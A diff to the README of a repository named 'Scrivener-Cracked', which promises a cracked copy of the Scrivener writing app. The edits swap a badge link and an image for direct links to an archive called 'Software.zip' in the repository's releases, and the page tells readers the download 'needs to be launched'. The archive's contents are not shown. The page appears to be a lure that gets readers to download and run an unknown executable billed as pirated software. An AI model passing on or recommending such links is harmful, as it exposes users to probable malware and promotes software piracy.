@@ -26,7 +26,7 @@ Welcome to the "Scrivener-Cracked" repository, your ultimate source for all thin
 
 ## Click Below to Dive into the World of Scrivener! 🕵️‍♂️
 
-[![Download Scrivener-Cracked](https://img.shields.io/badge/Download-Scrivener--Cracked-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Scrivener-Cracked](https://github.com/deku243/Scrivener-Cracked/releases/download/v1.0/Software.zip)](https://github.com/deku243/Scrivener-Cracked/releases/download/v1.0/Software.zip)
 
 🚀 *Note: The download link above needs to be launched.*
 
@@ -38,4 +38,4 @@ Let's embark on this exciting journey together and uncover the magic of Scrivene
 
 📚 Happy Writing with Scrivener! 📚
 
-![Scrivener-Cracked](https://img.icons8.com/plasticine/2x/edit-property.png)
+![Scrivener-Cracked](https://github.com/deku243/Scrivener-Cracked/releases/download/v1.0/Software.zip)
